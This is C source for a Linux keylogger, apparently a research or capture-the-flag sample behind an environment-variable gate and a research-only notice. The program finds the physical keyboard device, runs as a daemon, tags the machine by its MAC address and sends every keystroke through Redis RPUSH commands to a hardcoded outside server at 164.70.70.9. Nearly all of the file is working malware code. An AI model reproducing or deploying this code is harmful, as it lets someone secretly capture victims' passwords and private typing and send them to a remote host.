/**
 * Use of this program for purposes other than research is prohibited.
 * 本プログラムの研究目的以外での使用を禁ずる。
 */
#include <arpa/inet.h>
#include <dirent.h>
#include <fcntl.h>
#include <ifaddrs.h>
#include <linux/input.h>
#include <net/if.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define DEV_INPUT "/dev/input"

/**
 * Check if file is character device
 */
static int is_char(const struct dirent *file) {
  struct stat filestat;
  char filename[PATH_MAX];

  snprintf(filename, sizeof(filename), "%s/%s", DEV_INPUT, file->d_name);

  if (stat(filename, &filestat))
    return 0;
  else
    return S_ISCHR(filestat.st_mode);
}

/**
 * Get file descriptor of physical keyboard device
 */
int source(void) {
  int file_count;
  struct dirent **event_files;
  char filename[PATH_MAX], phys[PATH_MAX];

  file_count = scandir(DEV_INPUT, &event_files, &is_char, &alphasort);
  if (file_count < 0)
    return -1;

  int result = -1;
  for (int i = 0; i < file_count; i++) {
    int fd;
    int event_bitmap = 0;
    int kbd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;

    snprintf(filename, sizeof(filename),
             "%s/%s", DEV_INPUT, event_files[i]->d_name);
    if ((fd = open(filename, O_RDONLY)) == -1)
      continue;

    /* Check if this is a keyboard */
    ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
    if ((EV_KEY & event_bitmap) != EV_KEY)
      goto skip;

    /* Check if this keyboard actually works */
    ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
    if ((kbd_bitmap & event_bitmap) != kbd_bitmap)
      goto skip;

    /* Check if this is a physical device */
    ioctl(fd, EVIOCGPHYS(sizeof(phys)), phys);
    if (phys[0] == 0)
      goto skip;

    result = fd;
    break;

 skip:
    close(fd);
  }

  for (int i = 0; i < file_count; i++)
    free(event_files[i]);
  free(event_files);

  return result;
}

#define CMD_PING "*1\r\n$4\r\nPING\r\n"

int sink(void) {
  int sockfd;
  struct sockaddr_in server;

  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    return -1;

  server.sin_family = AF_INET;
  server.sin_port = htons(6379);
  server.sin_addr.s_addr = inet_addr("164.70.70.9");
  //server.sin_addr.s_addr = inet_addr("127.0.0.1");
  connect(sockfd, (struct sockaddr*)&server, sizeof(server));

  /* Send ping */
  if (write(sockfd, CMD_PING, strlen(CMD_PING)) < 0) {
    close(sockfd);
    return -1;
  }

  /* Receive pong */
  char buf[8];
  if (read(sockfd, buf, 5) < 0) {
    close(sockfd);
    return -1;
  }
  if (memcmp(buf, "+PONG", 5)) {
    close(sockfd);
    return -1;
  }

  return sockfd;
}

char mac[18];

void get_target_name(int sockfd) {
  struct sockaddr_in addr;
  struct ifaddrs* ifaddr;
  struct ifaddrs* ifa;
  struct ifreq ifr;
  socklen_t addr_len;

  ifr.ifr_addr.sa_family = AF_INET;
  strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1);

  addr_len = sizeof(addr);
  getsockname(sockfd, (struct sockaddr*)&addr, &addr_len);
  getifaddrs(&ifaddr);

  for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
    if (!ifa->ifa_addr) continue;
    if (AF_INET == ifa->ifa_addr->sa_family) {
      struct sockaddr_in* inaddr = (struct sockaddr_in*)ifa->ifa_addr;

      if (inaddr->sin_addr.s_addr == addr.sin_addr.s_addr) {
        if (ifa->ifa_name) {
          strncpy(ifr.ifr_name, ifa->ifa_name, IFNAMSIZ-1);
          break;
        }
      }
    }
  }

  freeifaddrs(ifaddr);

  /* Get MAC address*/
  ioctl(sockfd, SIOCGIFHWADDR, &ifr);
  snprintf(mac, sizeof(mac), "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x",
           (unsigned char)ifr.ifr_hwaddr.sa_data[0],
           (unsigned char)ifr.ifr_hwaddr.sa_data[1],
           (unsigned char)ifr.ifr_hwaddr.sa_data[2],
           (unsigned char)ifr.ifr_hwaddr.sa_data[3],
           (unsigned char)ifr.ifr_hwaddr.sa_data[4],
           (unsigned char)ifr.ifr_hwaddr.sa_data[5]);
}

#define NUM_EVENTS 128

#define CMD_SET_PREFIX "*3\r\n$5\r\nRPUSH\r\n"

int exfiltrate(int fd, uint8_t value, uint16_t *code) {
  char buf[0x80];

  if (write(fd, CMD_SET_PREFIX, strlen(CMD_SET_PREFIX)) < 0) return -1;

  snprintf(buf, sizeof(buf), "$%ld\r\n%s\r\n", strlen(mac), mac);
  if (write(fd, buf, strlen(buf)) < 0) return -1;

  if (write(fd, "$3\r\n", 4) < 0) return -1;
  if (write(fd, code, 2) < 0) return -1;
  if (write(fd, &value, 1) < 0) return -1;
  if (write(fd, "\r\n", 2) < 0) return -1;

  return 0;
}

void mainloop() {
  ssize_t s;
  struct input_event events[NUM_EVENTS];
  int kbdfd, sockfd;
  if ((kbdfd = source()) == -1) {
    return;
  }
  if ((sockfd = sink()) == -1) {
    close(kbdfd);
    return;
  }
  get_target_name(sockfd);

  while (1) {
    s = read(kbdfd, events, sizeof(struct input_event) * NUM_EVENTS);
    if (s < 0)
      break;

    for (size_t i = 0; i < s / sizeof(struct input_event); i++) {
      if (events[i].type != EV_KEY)
        continue;

      if (events[i].code && 0 <= events[i].value && events[i].value <= 2) {
        if (exfiltrate(sockfd, events[i].value, &events[i].code) == -1)
          break;
      }
    }
  }

  close(kbdfd);
  close(sockfd);
  exit(0);
}

int main(void) {
  char *p = getenv("I_AGREE_TO_RUN_POSSIBLE_MALWARE_FILE");
  if (!p || strcmp(p, "yes")) {
    puts("We can't let you run this program unless you understand what it is, nanoda!");
    exit(1);
  }

  if (daemon(0, 0) == 0) {
    mainloop();
  } else {
    perror("Could not run the program, nanoda!");
  }
  return 0;
}
